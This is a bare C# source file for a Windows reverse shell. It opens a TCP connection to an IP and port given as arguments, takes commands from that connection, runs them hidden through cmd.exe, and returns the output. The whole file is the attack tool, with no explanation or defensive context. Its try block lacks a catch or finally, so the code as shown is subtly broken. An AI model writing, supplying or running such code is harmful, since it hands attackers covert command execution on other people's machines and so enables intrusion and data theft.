using System;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;

class ReverseShell
{
    static void Main(string[] args)
    {
        try
        {
            string ip = args[0];
            int port = int.Parse(args[1]);
            TcpClient client = new TcpClient(ip, port);
            Stream stream = client.GetStream();
            StreamReader sr = new StreamReader(stream);
            StreamWriter sw = new StreamWriter(stream);
            sw.AutoFlush = true;
            while (true)
            {
                string command = sr.ReadLine();
                if (command == "exit")
                    break;
                else
                {
                    Process process = new Process();
                    process.StartInfo.FileName = "cmd.exe";
                    process.StartInfo.Arguments = "/c " + command;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    sw.WriteLine(output);
                 }
              }
          }
        }
}
